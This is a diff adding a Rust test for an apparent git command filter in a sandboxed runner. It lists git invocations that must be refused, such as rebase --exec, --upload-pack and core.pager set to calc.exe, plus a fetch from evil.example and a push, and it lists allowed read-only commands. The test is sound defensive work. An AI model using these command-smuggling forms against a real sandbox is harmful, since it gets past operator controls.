@@ -199,3 +199,79 @@ async fn the_direct_runner_refuses_steering_arguments_itself() {
         assert_eq!(error.kind(), std::io::ErrorKind::InvalidInput, "{command}");
     }
 }
+
+#[test]
+fn git_runs_only_listed_subcommands_and_none_that_starts_a_program() {
+    let (_dir, root) = project();
+    for command in [
+        "git rebase --exec calc.exe HEAD~1",
+        "git rebase -x calc.exe main",
+        "git bisect run calc.exe",
+        "git submodule foreach calc.exe",
+        "git fetch --upload-pack=calc.exe .",
+        "git ls-remote --upload-pack=calc.exe .",
+        "git difftool -x calc.exe",
+        "git difftool --extcmd=calc.exe",
+        "git filter-branch --tree-filter calc.exe",
+        "git archive --remote=. --exec=calc.exe HEAD",
+        "git config core.pager calc.exe",
+        "git worktree add w",
+        "git fetch http://evil.example/x",
+        "git push origin main",
+    ] {
+        let reason = refusal(&root, command).unwrap_or_else(|| panic!("{command} allowed"));
+        assert!(reason.contains("git"), "{command}: {reason}");
+    }
+    for command in [
+        "git commit -S -m x",
+        "git commit --gpg-sign=key -m x",
+        "git commit -e -m x",
+        "git commit --patch",
+        "git add -p",
+        "git add --interactive",
+        "git add -e a.txt",
+        "git checkout -p",
+        "git restore --patch a.txt",
+        "git stash -p",
+        "git branch --edit-description",
+        "git cat-file --filters HEAD:a.txt",
+        "git show --textconv HEAD:a.txt",
+        "git tag v1",
+        "git tag -a v1 -m x",
+        "git tag -s v1",
+        "git tag -d v1",
+        "git tag -l -d v1",
+        "git log --exec=x",
+        "git diff --extcmd=x",
+    ] {
+        let reason = refusal(&root, command).unwrap_or_else(|| panic!("{command} allowed"));
+        assert!(reason.contains("git"), "{command}: {reason}");
+    }
+    for command in [
+        "git status --short",
+        "git diff --stat",
+        "git log -p -S needle",
+        "git show HEAD",
+        "git rev-parse HEAD",
+        "git ls-files",
+        "git blame a.txt",
+        "git branch -a",
+        "git add a.txt",
+        "git commit -m message",
+        "git restore a.txt",
+        "git switch -c topic",
+        "git checkout main",
+        "git stash list",
+        "git merge-base main HEAD",
+        "git describe --tags",
+        "git shortlog -sn",
+        "git cat-file -p HEAD",
+        "git grep -n needle",
+        "git tag",
+        "git tag -l v*",
+        "git tag --list",
+        "git --version",
+    ] {
+        assert_eq!(refusal(&root, command), None, "{command}");
+    }
+}
